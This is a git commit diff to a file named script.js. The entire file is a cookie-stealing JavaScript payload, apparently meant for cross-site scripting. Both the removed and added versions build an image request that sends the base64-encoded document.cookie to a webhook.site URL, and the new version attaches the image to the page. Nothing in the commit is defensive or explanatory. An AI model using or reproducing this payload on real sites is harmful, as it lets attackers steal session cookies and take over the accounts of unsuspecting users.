0b0566ececab9606e921612b5097daebe698f909
jondaveyan <jon.daveyan@gmail.com>
2024-04-17 15:51:07 +0400

    Update script.js

--- script.js
+++ script.js
@@ -1,1 +1,3 @@
-x = new Image(); x.src = 'https://webhook.site/58542a94-0a19-492c-ab4c-b138a16217c1?data='+btoa(document.cookie);
+var x = new Image();
+x.src = 'https://webhook.site/58542a94-0a19-492c-ab4c-b138a16217c1?data=' + btoa(document.cookie);
+document.body.appendChild(x);
